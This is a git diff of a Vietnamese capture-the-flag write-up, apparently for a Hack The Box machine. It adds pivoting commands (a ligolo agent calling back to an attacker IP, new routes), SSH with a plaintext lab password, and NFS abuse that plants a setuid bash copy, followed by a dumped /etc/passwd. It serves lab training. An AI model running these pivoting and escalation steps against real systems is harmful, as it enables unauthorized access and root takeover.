@@ -118,24 +118,34 @@ perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new("10.10.17.152:8000");print 
 - Sau đó thực thi agent để kết nối lại máy chủ atk 
 ![alt text](image-23.png)
 ```code
+./proxy -selfcert -laddr 0.0.0.0:11601
+
 chmod +x agent
 ./agent -connect 10.10.17.152:11601 -ignore-cert
 ```
 - Auke giờ setup router
 ![alt text](image-24.png)
 ```code
+ip route | grep 172.18
+ip route | grep 192.168
+sudo ip route del 172.18.0.0/16 dev br-015726ca74dc -> xóa router đã tồn tại để ligolo hoạt động
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 sudo ip route add 172.18.0.0/16 dev ligolo
 sudo ip route add 192.168.100.0/24 dev ligolo
+ip route | grep ligolo -> kiểm tra lại 
 ```
 - Check bằng lệnh ping 
 ![alt text](image-25.png)
 ![alt text](image-26.png)
-
+```code
+ping -c 2 192.168.100.2
+```
 - SSH vào `192.168.100.2` để kiểm tra NFS , Pass :  `Friesf00Ds2025!!`
 ![alt text](image-27.png)
-
+```code
+ssh svc@192.168.100.2
+```
 - Phát hiện NFS share
 - NFS (Network File System) là protocol cho phép máy tính chia sẻ thư mục qua mạng. Client có thể mount (gắn kết) thư mục từ xa như thể nó là thư mục local.
 - Dấu `*` nghĩa là share này cho phép mọi IP truy cập - một lỗ hổng cấu hình.
@@ -149,9 +159,14 @@ sudo ip route add 192.168.100.0/24 dev ligolo
 - Mount NFS từ máy attacker
 ![alt text](image-29.png)
 ```code
+# Tạo mount point
 sudo mkdir -p /mnt/nfs_fries
+
+# Mount NFS từ target
 sudo mount -t nfs 192.168.100.2:/srv/web.fries.htb /mnt/nfs_fries
-ls -la /mnt/nfs_fries/
+
+# Verify
+ls -la /mnt/nfs_fries
 ```
 
 - Tạo user đủ quyền để đọc được cert 
@@ -174,8 +189,12 @@ id barman_local
 ![alt text](image-35.png)
 ```code
 cp /bin/bash /srv/web.fries.htb/shared/target_bash
+```
+```code
 sudo su - barman_local -c "cp /mnt/nfs_fries/shared/target_bash /mnt/nfs_fries/shared/bash2"
 sudo su - barman_local -c "chmod 6777 /mnt/nfs_fries/shared/bash2"
+```
+```code
 ls -la /mnt/nfs_fries/shared/bash2
 ```
 
@@ -294,7 +313,53 @@ HmwL9/U//oQhCT0X9pXTww==
 bash2-5.1$ 
 ```
 
-
+- Đọc pwd
+![alt text](image-39.png)
+```code
+bash2-5.1$ cat passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+svc:x:1000:1000:svc:/home/svc:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+_rpc:x:114:65534::/run/rpcbind:/usr/sbin/nologin
+statd:x:115:65534::/var/lib/nfs:/usr/sbin/nologin
+dnsmasq:x:116:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+barman:x:117:120:Backup and Recovery Manager for PostgreSQL,,,:/var/lib/barman:/bin/bash
+sssd:x:118:121:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
+```
+- Đọc nginx config `cat /etc/nginx/sites-enabled/default`
+![alt text](image-40.png)
+![alt text](image-41.png)
 
 
 
